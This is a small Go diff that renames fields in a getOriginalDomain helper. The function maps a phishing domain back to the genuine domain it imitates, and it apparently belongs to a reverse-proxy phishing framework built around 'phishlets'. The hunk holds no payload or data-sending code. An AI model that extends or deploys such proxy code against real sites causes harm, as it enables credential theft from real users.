@@ -1865,8 +1865,8 @@ func (p *HttpProxy) getHomeDir() string {
 
 func (p *HttpProxy) getOriginalDomain(pl *Phishlet, phishDomain string) string {
 	for _, ph := range pl.proxyHosts {
-		if strings.HasSuffix(phishDomain, ph.phish_sub+"."+pl.Site) {
-			return ph.orig_sub + "." + ph.domain
+		if strings.HasSuffix(phishDomain, ph.phish_subdomain+"."+pl.Name) {
+			return ph.orig_subdomain + "." + ph.domain
 		}
 	}
 	return ""
